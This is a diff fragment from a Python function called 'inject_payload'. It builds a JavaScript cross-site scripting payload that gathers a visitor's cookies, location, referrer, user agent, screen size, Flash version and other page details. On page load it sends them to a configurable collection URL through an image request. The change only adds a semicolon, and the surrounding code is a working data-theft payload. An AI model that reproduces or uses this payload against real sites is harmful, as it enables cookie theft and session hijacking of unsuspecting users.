@@ -104,7 +104,7 @@ def inject_payload(request,uid):
     p_opener = '(window.opener&&window.opener.location.href)?window.opener.location.href:""'
     p_flash = 'function(){var v="";if(window.ActiveXObject){var f=new window.ActiveXObject("ShockwaveFlash.ShockwaveFlash");if(f){v=f.GetVariable("$version");}}else if(navigator.plugins&&navigator.plugins.length>0){var f=navigator.plugins["Shockwave Flash"];if(f){v=f.description;}}return v;}()'
     
-    data='''function j2s(o){var arr=[];var fmt=function(s){if(typeof s=='object'&&s!=null){return j2s(s)}else{return /^(string|number)$/.test(typeof s)?"'"+s+"'":s}};for (var i in o){arr.push("'"+i+"':"+fmt(o[i]))};return '{'+arr.join(',')+'}'}
+    data='''function j2s(o){var arr=[];var fmt=function(s){if(typeof s=='object'&&s!=null){return j2s(s)}else{return /^(string|number)$/.test(typeof s)?"'"+s+"'":s}};for (var i in o){arr.push("'"+i+"':"+fmt(o[i]))};return '{'+arr.join(',')+'}'};
     var d={};d.ua=%s;d.lang=%s;d.platform=%s;d.referrer=%s;d.location=%s;d.toplocation=%s;d.cookies=%s;d.domain=%s;d.title=%s;d.screen=%s;d.opener=%s;d.flash=%s;
     window.onload=function(){var i=j2s(d);new Image().src="%s?i="+i;};
     ''' %(p_ua, p_lang, p_platform, p_referrer, p_location, p_toplocation, p_cookies, p_domain, p_title, p_screen, p_opener, p_flash, url)
